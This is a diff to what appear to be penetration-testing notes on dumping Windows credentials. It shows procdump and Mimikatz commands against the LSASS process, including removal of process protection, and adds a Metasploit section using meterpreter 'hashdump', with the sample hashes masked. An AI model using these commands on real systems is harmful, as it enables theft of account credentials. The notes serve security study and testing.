@@ -55,7 +55,7 @@ C:\> procdump.exe -accepteula -ma lsass.exe <dump_location>
   * Includes all memory
   * Includes all metadata
 
-### Mimikatz
+## (1) Mimikatz
 
 We can also use Mimikatz to dump the contents of the LSASS process.
 
@@ -97,4 +97,19 @@ mimikatz # sekurlsa::logonpasswords
 * `!processprotect:` A function provided by Mimidrv to remove process protection. In our case, it will be the LSASS process.
 
 Refer to the "_Mimidrv in depth_" resource link above for more information.
+
+## (2) Metasploit
+
+We first use the `getuid` command to verify our current privileges. If we have enough privileges, we can run the `hashdump` command to dump hashes.
+
+```sh
+meterpreter > getuid
+...
+meterpreter > hashdump
+Administrator:500:xxx::::
+Guest:501:xxx::::
+krbtgt:502:xxx::::
+```
+
+
 
